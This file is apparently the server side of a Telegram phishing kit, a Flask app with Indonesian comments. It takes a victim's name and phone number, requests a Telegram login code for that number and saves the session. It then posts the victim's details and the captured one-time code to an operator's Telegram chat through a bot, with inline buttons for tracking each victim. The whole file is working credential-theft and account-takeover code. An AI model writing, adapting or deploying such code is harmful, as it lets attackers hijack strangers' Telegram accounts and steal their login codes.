import os
import requests
import asyncio
import re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

user_sessions = {}
active_status_msg = {}

def bot_api(method, payload):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    return requests.post(url, json=payload).json()

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    # Menjalankan fungsi asinkron dengan loop yang aman
    return asyncio.run(handle_register(data))

async def handle_register(data):
    try:
        step = data.get('step')
        raw_nomor = data.get('nomor', '').strip().replace(" ", "")
        nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
        nama = data.get('nama', 'User')

        client = TelegramClient(StringSession(""), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            user_sessions[nomor] = {"session": client.session.save(), "nama": nama}
            
            # Format pesan sesuai permintaan
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"track_{nomor}"}]]}
            })
            await client.disconnect()
            return jsonify({"status": "success"}), 200
        return jsonify({"status": "error"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "callback_query" in update:
        call = update["callback_query"]
        data = call["data"]
        
        if data.startswith("track_"):
            nomor = data.split("_")[1]
            # Kirim pesan status menunggu
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": "Bot siap menerima OTP!",
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            active_status_msg[nomor] = res.get("result", {}).get("message_id")
            
            session_str = user_sessions.get(nomor, {}).get("session")
            if session_str:
                asyncio.run(start_otp_listener(nomor, session_str))

        elif data.startswith("exit_"):
            nomor = data.split("_")[1]
            if nomor in active_status_msg:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
            # Pesan keluar
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline!"})

    return jsonify({"status": "success"}), 200

async def start_otp_listener(nomor, session_str):
    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
    await client.connect()
    
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        otp = re.search(r'\b\d{5}\b', event.raw_text)
        if otp:
            if nomor in active_status_msg:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
            
            nama = user_sessions.get(nomor, {}).get("nama", "User")
            # Kirim log dengan OTP
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp.group(0)}`",
                "parse_mode": "Markdown"
            })
            await client.disconnect()

    await asyncio.sleep(300)
    await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))